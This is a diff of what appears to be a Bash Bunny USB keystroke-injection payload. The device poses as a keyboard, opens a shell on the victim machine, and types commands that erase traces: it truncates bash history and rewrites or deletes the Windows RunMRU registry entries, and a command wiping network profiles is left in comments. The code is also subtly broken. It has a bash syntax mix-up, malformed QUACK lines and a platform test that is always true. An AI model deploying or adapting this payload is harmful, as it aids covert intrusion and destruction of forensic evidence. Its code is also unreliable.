@@ -8,7 +8,7 @@
 #
 # Cleans the input history on Windows, Mac and Linux
 #
-LED G
+LED R
 
 #+++ CONFIG +++
 
@@ -32,13 +32,14 @@ LINES=0
 
 if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
     LED B
-    PLATFORM_COMMAND="cmd"
+    PLATFORM_COMMAND="powershell"
 else
-    LED O
+    LED R G
     PLATFORM_COMMAND="terminal"
 fi
 
 # START
+# TODO: should be set to Mac Keyboard
 ATTACKMODE HID
 
 QUACK DELAY 500
@@ -52,12 +53,13 @@ QUACK DELAY 100
 QUACK STRING "${PLATFORM_COMMAND}"
 QUACK DELAY 200
 QUACK ENTER
-QUACK DELAY 1000
+QUACK DELAY 500
 
 # PLATFORM COMMANDS
 if [ "$PLATFORM_COMMAND"=="terminal" ]; then
 # MAC / LINUX
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
+
 
     if [ "$LINES" -gt "0" ]; then
         QUACK STRING head -n -$LINES "~/.bash_history"
@@ -72,7 +74,14 @@ if [ "$PLATFORM_COMMAND"=="terminal" ]; then
     fi
 else
 # WINDOWS
+    @echo off
     #++ INSERT CUSTOM WINDOWS CLEANUP GOODNESS ++
+
+
+    # REMOVE ALL ETHERNET ADAPTERS
+    # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
+    # QUACK ENTER
+    # QUACK DELAY 100
 
     # REMOVE EXTRA ETHERNET CONNECTIONS
     # QUACK STRING netsh show profiles
@@ -84,12 +93,37 @@ else
     # QUACK ENTER
     # QUACK DELAY 100
 
-    # REMOVE ALL ETHERNET ADAPTERS
-    QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
-    QUACK ENTER
-    QUACK DELAY 100
-    QUACK STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-    QUACK ENTER
+    if [ "$LINES" -gt "0" ]; then
+        QUACK setlocal enableextensions enabledelayedexpansion
+        QUACK ENTER
+        QUACK set len="${LINES}"
+        QUACK set /a len_pos=%len%-1
+        QUACK ENTER
+
+        QUACK for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
+        QUACK ENTER
+        QUACK for /f %%c in ('cmd /u /v /q /c"(echo(!mru!)" ^| find /v "" ^| findstr /r /c:"[a-z]" ^| find /c /v ""') do set "str_len=%%c"
+        QUACK ENTER
+        # Get the last Nr of defined lines from MRUList
+        set list=!mru:~0,%len%!
+        QUACK ENTER
+        # Set the new MRUList
+        QUACK set original_list=!mru:~%len%,%str_len%!
+        QUACK ENTER
+
+        # Delete old MRUList
+        QUACK reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
+        QUACK ENTER
+        # Add new MRUList
+        QUACK reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /t Reg_Sz /d %original_list%
+        QUACK ENTER
+        # Delete the last Nr of lines from Registry
+        QUACK for /l %%d in (0,1,%len_pos%) do (reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v !list:~%%d,1! /f)
+    else
+        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+        QUACK ENTER
+    fi
+
 fi
 
 QUACK DELAY 100
